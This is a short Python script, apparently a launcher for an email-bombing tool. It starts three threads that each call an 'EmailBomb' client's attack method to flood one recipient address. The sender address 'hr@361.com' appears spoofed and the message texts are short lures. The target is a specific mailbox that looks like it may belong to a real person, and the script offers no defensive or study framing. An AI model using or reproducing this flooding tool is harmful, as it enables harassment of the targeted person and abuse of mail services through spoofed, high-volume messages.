# -*- coding: utf-8 -*-

import EmailBomb
import threading

thread_num = 3

clients = [
    EmailBomb.EmailBomb(
        from_addr="hr@361.com",
        to_addr="15619047890@163.com"
    ) for id in range(thread_num)
]

for client in clients:
    thread = threading.Thread(target=client.attack, args=("hello! my friend!", "hr: you got it!",))
    thread.start()
